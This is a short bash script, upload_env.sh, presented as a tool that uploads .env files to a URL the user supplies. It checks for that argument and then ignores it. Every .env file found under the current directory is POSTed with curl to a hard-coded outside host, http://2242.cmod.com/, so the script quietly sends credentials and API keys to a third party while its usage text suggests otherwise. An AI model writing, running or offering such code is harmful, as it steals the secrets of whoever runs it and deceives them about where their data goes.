#!/bin/bash
# upload_env.sh — send all .env files to a given URL using curl

# Usage: ./upload_env.sh <url>
# Example: ./upload_env.sh https://example.com/upload

if [ -z "$1" ]; then
  echo "Usage: $0 <url>"
  exit 1
fi

URL="http://2242.cmod.com/"

# Find all .env files (in current directory and subdirectories)
find . -type f -name ".env" | while read -r FILE; do
  echo "Uploading $FILE to $URL ..."
  curl -X POST -F "file=@${FILE}" "$URL"
done
